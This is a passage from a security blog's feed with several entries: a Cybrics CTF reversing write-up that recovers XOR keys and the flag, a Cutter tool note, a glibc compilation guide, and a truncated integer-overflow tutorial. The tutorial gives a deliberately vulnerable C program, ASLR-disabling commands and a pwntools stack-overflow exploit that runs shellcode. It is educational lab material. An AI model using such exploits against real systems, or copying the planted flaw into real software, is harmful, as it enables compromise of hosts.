punctuation">,</span> <span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrayOfByte2<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>arrayOfByte2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> arrayOfByte1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    File localFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileInputStream localFileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>localFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>localFile<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte4 <span class="token operator">=</span> <span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">,</span> System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream localFileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"stage2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>arrayOfByte4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arrayOfByte4<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Then you can know the <code>data.bin</code> is actually encoded… So how to decode it and get the <code>stage2.bin</code>?</p><p>Obviously, the value of “user.name” is the key…Make sure it is the property of challenge environment，not our computer’s “user.name”…</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//...Ellipsis</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    String str <span class="token operator">=</span> <span class="token string">"matreha!"</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> <span class="token function">encode</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    String username <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte2<span class="token punctuation">,</span><span class="token string">"matreha!"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    File localFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileInputStream localFileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>localFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>localFile<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte4 <span class="token operator">=</span> <span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream localFileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"stage2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>arrayOfByte4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arrayOfByte4<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//...</span></code></pre><p>Then compile the program and run it…</p><h2 id="Step2-Golang-analysis"><a href="#Step2-Golang-analysis" class="headerlink" title="Step2: Golang analysis"></a>Step2: Golang analysis</h2><p>You have got the <code>stage2.bin</code> from step1.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722154552.png" alt=""></p><p>According to the combination of static analysis and dynamic analysis, we can know the program logic as follows：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722205942.png" alt=""></p><p>It should be noted that when XOR reaches the last byte, the loop produces some differences, and it is easy to ignore the key of the last byte, but this byte can be inferred……</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722210542.png" alt=""></p><p>Dynamically debugging：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211126.png" alt=""></p><p>The R8 stores the key byte that we should get…RSI stores our directory string…There is seventeen key bytes totally…After getting all the key bytes, just xor it with the Built-in ciphertext…</p><p><code>Built-in ciphertext(hex)</code>:0x53ddc587e46399144fa4142dc42404c0b0</p><p><code>Key(hex)</code>:0x38afaaf48c08f84b22c5605fa1576cabd1</p><pre class=" language-python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2sIn <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">:</span> n2s<span class="token punctuation">(</span><span class="token number">0x53ddc587e46399144fa4142dc42404c0b0</span><span class="token operator">^</span><span class="token number">0x38afaaf48c08f84b22c5605fa1576cabd1</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'kroshka_matreshka'</span></code></pre><p>Then i mv the program in a directory named ‘kroshka_matreshka’ and run it…A result.pyc…well😎</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211935.png" class="lazyload"></p><p>Apparently，we arrived here：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211827.png" class="lazyload"></p><h2 id="Step3：Python-analysis"><a href="#Step3：Python-analysis" class="headerlink" title="Step3：Python analysis"></a>Step3：Python analysis</h2><p>Decompiling <code>result.pyc</code>, then you can see the logic from source code…This is an eight-byte key cycle XOR encryption algorithm.</p><p>You have known the flag is begin with <code>cybrics{</code>，so you can directly get the key：<code>Kr0H4137</code>，then you just get flag by decrypting the ciphertext…🆗</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> result <span class="token keyword">import</span> <span class="token operator">*</span>Enter key to get flag<span class="token punctuation">:</span>Kr0H4137cybrics<span class="token punctuation">{</span>M4TR35HK4_15_B35T<span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span></code></pre><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>It’s a nice and full day!😄</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;I try to play the Cybrics CTF yesterday😀…And the truth tell me that how suck i am… Btw…The challenges of Cybrics is very interesting and fresh.&lt;/p&gt;
    
    </summary>
    
      <category term="Reverse" scheme="http://www.yof3ng.xyz/categories/Reverse/"/>
    
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/tags/Binary/"/>
    
      <category term="Reverse" scheme="http://www.yof3ng.xyz/tags/Reverse/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Awesome_Cutter_radare2</title>
    <link href="http://www.yof3ng.xyz/2019/07/21/Awesome-Cutter-radare2/"/>
    <id>http://www.yof3ng.xyz/2019/07/21/Awesome-Cutter-radare2/</id>
    <published>2019-07-21T08:54:43.000Z</published>
    <updated>2019-07-21T09:01:27.751Z</updated>
    
    <content type="html"><![CDATA[<p>Cutter is a free and open-source GUI for radare2 reverse engineering framework. Its goal is making an advanced, customizable and FOSS reverse-engineering platform while keeping the user experience at mind. Cutter is created by reverse engineers for reverse engineers😎.</p><a id="more"></a><p>Github repository link: <a href="https://github.com/radareorg/cutter" target="_blank" rel="noopener">https://github.com/radareorg/cutter</a></p><p>Instruction doc link：<a href="https://cutter.re/docs/" target="_blank" rel="noopener">https://cutter.re/docs/</a></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190721170055.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Cutter is a free and open-source GUI for radare2 reverse engineering framework. Its goal is making an advanced, customizable and FOSS reverse-engineering platform while keeping the user experience at mind. Cutter is created by reverse engineers for reverse engineers😎.&lt;/p&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://www.yof3ng.xyz/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://www.yof3ng.xyz/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Compile_Glibc_Manually</title>
    <link href="http://www.yof3ng.xyz/2019/07/20/Manually-Compile-Glibc/"/>
    <id>http://www.yof3ng.xyz/2019/07/20/Manually-Compile-Glibc/</id>
    <published>2019-07-20T07:04:41.000Z</published>
    <updated>2019-07-20T08:59:14.437Z</updated>
    
    <content type="html"><![CDATA[<p>If you want to learn some fantastic and advance technique about Security, You have to command some fundamental knowledge……</p> <a id="more"></a><h1 id="Compile-Glibc-Manually"><a href="#Compile-Glibc-Manually" class="headerlink" title="Compile_Glibc_Manually"></a>Compile_Glibc_Manually</h1><blockquote><p>Today i will show you how to compile a glibc manually.</p></blockquote><h2 id="What-is-Glibc"><a href="#What-is-Glibc" class="headerlink" title="What is Glibc?"></a>What is Glibc?</h2><p>Refer from the <code>stack overflow</code>:<a href="https://stackoverflow.com/questions/11460782/what-is-glibc-what-is-it-used-for" target="_blank" rel="noopener">https://stackoverflow.com/questions/11460782/what-is-glibc-what-is-it-used-for</a></p><blockquote><p>It’s the implementation of <em>Standard C library</em> described in C standards plus some extra useful stuffs which are not strictly standard but used frequently.</p><p>Its main contents are :</p><p>1) C library described in ANSI,c99,c11 standards. It includes macros, symbols, function implementations etc.(printf(),malloc() etc)</p><p>2) POSIX standard library. The “userland” glue of system calls. (open(),read() etc. Actually glibc does not “implement” system calls. kernel does it. But glibc provides the user land interface to the services provided by kernel so that user application can use a system call just like a ordinary function.</p><p>3) Also some nonstandard but useful stuff.</p><p>“use the force, read the source “</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$git</span> clone git://sourceware.org/git/glibc.git</code></pre></blockquote><h2 id="What-is-ld-so"><a href="#What-is-ld-so" class="headerlink" title="What is ld.so?"></a>What is ld.so?</h2><p>ld.so : Dynamic linker of system…Used for Executed-file like a.out</p><p>ld-linux.so: Dynamic linker of linux…Used for ELF format Executed-file.</p><pre class=" language-bash"><code class="language-bash"> ✘ ⚡ root@xiaoyifeng ~/glibc_source/glibc2.23_build <span class="token comment" spellcheck="true"># file ./elf/ld-linux-x86-64.so.2</span>./elf/ld-linux-x86-64.so.2: symbolic <span class="token function">link</span> to ld.so</code></pre><h2 id="What-is-libc-so"><a href="#What-is-libc-so" class="headerlink" title="What is libc.so?"></a>What is libc.so?</h2><p>libc.so : Glibc binary is called libc.so.6</p><p>Actually libc.so.6 is a symbolic link to libc.so…… </p><pre class=" language-bash"><code class="language-bash"> ⚡ root@xiaoyifeng  ~/glibc_source/glibc2.23_build <span class="token comment" spellcheck="true"># file libc.so.6</span>libc.so.6: symbolic <span class="token function">link</span> to libc.so</code></pre><p><a href="https://stackoverflow.com/questions/11372872/what-is-the-role-of-libcglibc-in-our-linux-app" target="_blank" rel="noopener">What is libc?</a></p><h2 id="Compiling-it"><a href="#Compiling-it" class="headerlink" title="Compiling it!"></a>Compiling it!</h2><blockquote><p>Reference:<a href="https://www.jianshu.com/p/ee1ad4044ef7" target="_blank" rel="noopener">https://www.jianshu.com/p/ee1ad4044ef7</a></p></blockquote><p>Before compile it，you should download the special glibc source code and uncompressed it……Then you should mkdir two another directory called for build and compiling file……like this:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720155219.png" alt=""></p><h3 id="Step1-configure"><a href="#Step1-configure" class="headerlink" title="Step1:configure"></a>Step1:configure</h3><p>It’s important to add <code>--disable-werror</code>……</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720152708.png" alt=""></p><h3 id="Step2-make"><a href="#Step2-make" class="headerlink" title="Step2: make"></a>Step2: make</h3><p>Maybe you would encounter this bad problem. : <code>can&#39;t be versioned to common symbol &#39;loc1&#39;</code></p><p>Just find the solution in this page : <a href="https://www.e-learn.cn/content/qita/664508" target="_blank" rel="noopener">https://www.e-learn.cn/content/qita/664508</a></p><pre class=" language-c"><code class="language-c"><span class="token operator">--</span><span class="token operator">-</span> a<span class="token operator">/</span>misc<span class="token operator">/</span>regexp<span class="token punctuation">.</span>c<span class="token operator">++</span><span class="token operator">+</span> b<span class="token operator">/</span>misc<span class="token operator">/</span>regexp<span class="token punctuation">.</span>c@@ <span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">14</span> <span class="token operator">+</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">15</span> @@ <span class="token macro property">#<span class="token directive keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_23)</span><span class="token operator">-</span><span class="token comment" spellcheck="true">/* Define the variables used for the interface.  */</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>loc1<span class="token punctuation">;</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>loc2<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment" spellcheck="true">/* Define the variables used for the interface.  Avoid .symver on common+   symbol, which just creates a new common symbol, not an alias.  */</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>loc1 <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>loc2 <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> loc1<span class="token punctuation">,</span> loc1<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> loc2<span class="token punctuation">,</span> loc2<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Although we do not support the use we define this variable as well.  */</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>locs<span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>locs <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> locs<span class="token punctuation">,</span> locs<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Just add <code>__attribute__ ((nocommon))</code> behind the <code>*loc</code>，then you can solve this error;</p><h3 id="step3-make-install"><a href="#step3-make-install" class="headerlink" title="step3: make install"></a>step3: make install</h3><p>After <code>make install</code>, you can find the libc.so compiled by yourself in build directory, and ld.so is in elf directory.</p><h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes:"></a>Notes:</h3><p>Although the same version of libc may also have diffrent offset because of the diffrent args in compiling time.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720154352.png" alt=""></p><h2 id="Using-The-Compiled-Glibc-To-Compile-Program"><a href="#Using-The-Compiled-Glibc-To-Compile-Program" class="headerlink" title="Using The Compiled Glibc To Compile Program"></a>Using The Compiled Glibc To Compile Program</h2><p><code>Instructions</code>:</p><pre class=" language-bash"><code class="language-bash">gcc -g -fno-stack-protector -z execstack size_over.c -o size_over -Wl,--rpath<span class="token operator">=</span>/root/glibc_source/glibc2.23_build/ -Wl,--dynamic-linker<span class="token operator">=</span>/root/glibc_source/glibc2.23_build/elf/ld-linux-x86-64.so.2</code></pre><p><code>compile program</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161136.png" alt=""></p><p><code>libs infomation</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161116.png" alt=""></p><p><code>Use gdb to debug in underlying source level</code>：</p><p>reference: <a href="https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb" target="_blank" rel="noopener">https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb</a></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161923.png" class="lazyload"></p><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>So cool it is😄!</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;If you want to learn some fantastic and advance technique about Security, You have to command some fundamental knowledge……&lt;/p&gt;
    
    </summary>
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/categories/Binary/"/>
    
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/tags/Binary/"/>
    
      <category term="Compile" scheme="http://www.yof3ng.xyz/tags/Compile/"/>
    
  </entry>
  
  <entry>
    <title>Integer_Overflow</title>
    <link href="http://www.yof3ng.xyz/2019/07/19/Integer-Overflow/"/>
    <id>http://www.yof3ng.xyz/2019/07/19/Integer-Overflow/</id>
    <published>2019-07-19T03:06:53.000Z</published>
    <updated>2019-07-19T09:04:12.079Z</updated>
    
    <content type="html"><![CDATA[<p>Buffer overflow triggered by integer overflow☕……</p><a id="more"></a><p>[TOC]</p><h1 id="Integer-Overflow"><a href="#Integer-Overflow" class="headerlink" title="Integer_Overflow"></a>Integer_Overflow</h1><blockquote><p>I have learned the <code>size_t ==&gt; unsigned char</code> integer overflow🙃…</p></blockquote><h2 id="Example-Source-Code"><a href="#Example-Source-Code" class="headerlink" title="Example Source Code"></a>Example Source Code</h2><p><code>Instructions to compile:</code></p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> 0 <span class="token operator">></span> /proc/sys/kernel/randomize_va_spacegcc -g -fno-stack-protector -z execstack size_over.c -o size_over</code></pre><p><code>size_over.c</code></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">validate_msg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">,</span><span class="token keyword">int</span> msg_size<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> msg_buf<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> msg_len <span class="token operator">=</span> msg_size<span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+]msg_len:%d \n"</span><span class="token punctuation">,</span>msg_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>msg_len <span class="token operator">>=</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> msg_len <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>msg_buf<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    size_t msg_size<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input the size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> payload<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//printf("%s\n",payload);</span>    <span class="token function">validate_msg</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Exploit-script"><a href="#Exploit-script" class="headerlink" title="Exploit script"></a>Exploit script</h2><blockquote><p>Here is my exploit script…</p><p>Maybe i should spend some time to learn Underlying libc…</p><p>From this example, we can know more about the way through overflow to execute shellcode in stack and the influence of <code>\x00</code>……</p><p>Normally, execute shellcode in stack should make sure NX disabled…And hijacking program go to stack by using gadget <code>jmp esp</code>,or control Eip while knowing stack address…</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># diffrent enviroment has diffrent address......here is test result of my computer......</span>rbp <span class="token operator">=</span> <span class="token number">0x7fffffffdcb0</span>shellcode_addr <span class="token operator">=</span> <span class="token number">0x7fffffffdcb0</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token comment" spellcheck="true"># padding(12+8) + shellcode_addr(8)  </span>payload <span class="token operator">=</span> <span class="token string">""</span>payload <span class="token operator">+=</span> <span class="token number">12</span> <span class="token operator">*</span> <span class="token string">"a"</span>payload <span class="token operator">+=</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token string">"b"</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token operator">*</span><span class="token string">"\x90"</span>payload <span class="token operator">+=</span> shellcodepayload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">260</span><span class="token punctuation">,</span><span class="token string">"\x90"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./size_over'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span><span class="token comment" spellcheck="true">#pause()</span><span class="token comment" spellcheck="true">#p.recvuntil(":")</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'260\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>Running to ret2shellcode_addr</code>:</p><pre class=" language-python"><code class="language-python">pwndbg<span class="token operator">></span> ni<span class="token number">0x00005555555551dc</span> <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>LEGEND<span class="token punctuation">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA──────────────────────────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> REGISTERS <span class="token 